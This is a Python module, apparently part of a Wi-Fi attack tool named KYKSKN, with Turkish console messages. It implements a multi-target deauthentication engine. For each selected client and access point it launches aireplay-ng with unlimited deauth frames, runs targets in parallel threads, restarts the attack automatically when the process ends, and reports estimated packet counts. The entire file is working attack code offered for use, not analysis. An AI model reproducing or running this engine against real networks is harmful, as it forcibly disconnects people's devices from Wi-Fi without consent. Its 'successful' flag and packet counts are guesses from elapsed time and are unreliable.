"""
KYKSKN - Deauthentication Attack Engine
"""

import subprocess
import threading
import time
from typing import List, Dict, Optional
from dataclasses import dataclass, field
from datetime import datetime
from rich.console import Console
from utils.logger import logger
from config.settings import DEAUTH_PACKETS_PER_BURST, MAX_CONCURRENT_ATTACKS

console = Console()


@dataclass
class AttackTarget:
    """Attack target data structure"""
    client_mac: str
    ap_bssid: str
    ap_essid: str
    packets_sent: int = 0
    successful: bool = False
    start_time: Optional[datetime] = None
    last_packet_time: Optional[datetime] = None
    process: Optional[subprocess.Popen] = None
    
    def __str__(self):
        return f"{self.client_mac} @ {self.ap_essid}"


class DeauthEngine:
    """Multi-target deauthentication attack engine"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.targets: Dict[str, AttackTarget] = {}
        self.attack_threads: List[threading.Thread] = []
        self.is_attacking = False
        self.lock = threading.Lock()
        
    def add_target(self, client_mac: str, ap_bssid: str, ap_essid: str = "Unknown"):
        """Add a target to attack list"""
        with self.lock:
            target = AttackTarget(
                client_mac=client_mac.upper(),
                ap_bssid=ap_bssid.upper(),
                ap_essid=ap_essid
            )
            self.targets[client_mac.upper()] = target
            logger.info(f"Added target: {target}")
    
    def remove_target(self, client_mac: str):
        """Remove a target from attack list"""
        with self.lock:
            if client_mac.upper() in self.targets:
                target = self.targets[client_mac.upper()]
                if target.process:
                    try:
                        target.process.terminate()
                        target.process.wait(timeout=2)
                    except Exception:
                        try:
                            target.process.kill()
                        except Exception:
                            pass
                del self.targets[client_mac.upper()]
                logger.info(f"Removed target: {client_mac}")
    
    def start_attack(self):
        """Start deauth attack on all targets"""
        if self.is_attacking:
            console.print("[yellow]⚠️  Saldırı zaten devam ediyor![/yellow]")
            return
        
        if not self.targets:
            console.print("[yellow]⚠️  Hedef bulunamadı![/yellow]")
            return
        
        self.is_attacking = True
        logger.info(f"Starting attack on {len(self.targets)} targets")
        console.print(f"[green]🎯 Saldırı başlatılıyor... ({len(self.targets)} hedef)[/green]")
        
        # Start attack thread for each target
        for target in self.targets.values():
            thread = threading.Thread(
                target=self._attack_target,
                args=(target,),
                daemon=True
            )
            thread.start()
            self.attack_threads.append(thread)
            time.sleep(0.1)  # Stagger thread starts
    
    def stop_attack(self):
        """Stop all attacks"""
        if not self.is_attacking:
            return
        
        logger.info("Stopping all attacks")
        console.print("[yellow]⚙️  Saldırı durduruluyor...[/yellow]")
        
        self.is_attacking = False
        
        # Terminate all processes
        with self.lock:
            for target in self.targets.values():
                if target.process:
                    try:
                        target.process.terminate()
                        target.process.wait(timeout=2)
                    except Exception:
                        try:
                            target.process.kill()
                        except Exception:
                            pass
                    target.process = None
        
        # Wait for threads to finish
        for thread in self.attack_threads:
            thread.join(timeout=3)
        
        self.attack_threads.clear()
        console.print("[green]✓ Saldırı durduruldu[/green]")
    
    def _attack_target(self, target: AttackTarget):
        """Attack a single target (runs in separate thread)"""
        try:
            target.start_time = datetime.now()
            logger.info(f"Starting attack on {target.client_mac}")
            
            # Build aireplay-ng command - DİNAMİK INTERFACE
            cmd = [
                'aireplay-ng',
                '--deauth', '0',  # 0 = SINIRSIZ (kapatılana kadar devam eder)
                '-a', target.ap_bssid,  # AP BSSID
                '-c', target.client_mac,  # Client MAC
                self.interface  # Dinamik interface (wlan0mon, wlan0, vb.)
            ]
            
            # DEBUG: Log command
            logger.info(f"Deauth command: {' '.join(cmd)}")
            console.print(f"[dim]🔍 DEBUG: Komut: {' '.join(cmd)}[/dim]")
            
            # Start aireplay-ng process - STDOUT/STDERR'ı GÖR
            target.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,  # stderr'ı stdout'a yönlendir
                text=True,
                bufsize=1  # Line buffered
            )
            
            # Monitor process output
            while self.is_attacking and target.process:
                try:
                    # Check if process is still running
                    poll_result = target.process.poll()
                    
                    if poll_result is not None:
                        # Process ended
                        logger.warning(f"Process ended for {target.client_mac} with code {poll_result}")
                        
                        # Read any remaining output
                        if target.process.stdout:
                            output = target.process.stdout.read()
                            if output:
                                logger.info(f"Process output: {output}")
                                console.print(f"[dim]🔍 DEBUG: aireplay-ng çıktı: {output[:200]}[/dim]")
                        
                        # Restart if attack still active
                        if self.is_attacking:
                            logger.info(f"Restarting attack on {target.client_mac}...")
                            time.sleep(1)
                            
                            target.process = subprocess.Popen(
                                cmd,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT,
                                text=True,
                                bufsize=1
                            )
                    else:
                        # Process still running, read output
                        if target.process.stdout:
                            try:
                                import select
                                if select.select([target.process.stdout], [], [], 0)[0]:
                                    line = target.process.stdout.readline()
                                    if line:
                                        logger.debug(f"aireplay-ng: {line.strip()}")
                            except:
                                pass
                    
                    # Update packet count (estimate)
                    elapsed = (datetime.now() - target.start_time).total_seconds()
                    target.packets_sent = int(elapsed * 10)  # ~10 packets/sec
                    target.last_packet_time = datetime.now()
                    
                    # Check for success indicators
                    if target.packets_sent > 100:
                        target.successful = True
                    
                    time.sleep(1)
                    
                except Exception as e:
                    logger.error(f"Error in attack loop for {target.client_mac}: {e}")
                    time.sleep(2)
            
        except Exception as e:
            logger.error(f"Error attacking {target.client_mac}: {e}")
        finally:
            if target.process:
                try:
                    target.process.terminate()
                    target.process.wait(timeout=2)
                except Exception:
                    try:
                        target.process.kill()
                    except Exception:
                        pass
                target.process = None
    
    def get_attack_stats(self) -> Dict:
        """Get current attack statistics"""
        with self.lock:
            total_targets = len(self.targets)
            active_targets = sum(1 for t in self.targets.values() if t.process and t.process.poll() is None)
            successful_targets = sum(1 for t in self.targets.values() if t.successful)
            total_packets = sum(t.packets_sent for t in self.targets.values())
            
            return {
                'total_targets': total_targets,
                'active_targets': active_targets,
                'successful_targets': successful_targets,
                'total_packets': total_packets,
                'is_attacking': self.is_attacking
            }
    
    def get_target_status(self, client_mac: str) -> Optional[Dict]:
        """Get status of specific target"""
        with self.lock:
            target = self.targets.get(client_mac.upper())
            if not target:
                return None
            
            is_active = target.process and target.process.poll() is None
            
            elapsed = 0
            if target.start_time:
                elapsed = (datetime.now() - target.start_time).total_seconds()
            
            return {
                'client_mac': target.client_mac,
                'ap_bssid': target.ap_bssid,
                'ap_essid': target.ap_essid,
                'packets_sent': target.packets_sent,
                'successful': target.successful,
                'is_active': is_active,
                'elapsed_time': elapsed
            }
    
    def get_all_targets_status(self) -> List[Dict]:
        """Get status of all targets"""
        statuses = []
        for client_mac in list(self.targets.keys()):
            status = self.get_target_status(client_mac)
            if status:
                statuses.append(status)
        return statuses
    
    def cleanup(self):
        """Clean up all resources"""
        self.stop_attack()
        with self.lock:
            self.targets.clear()

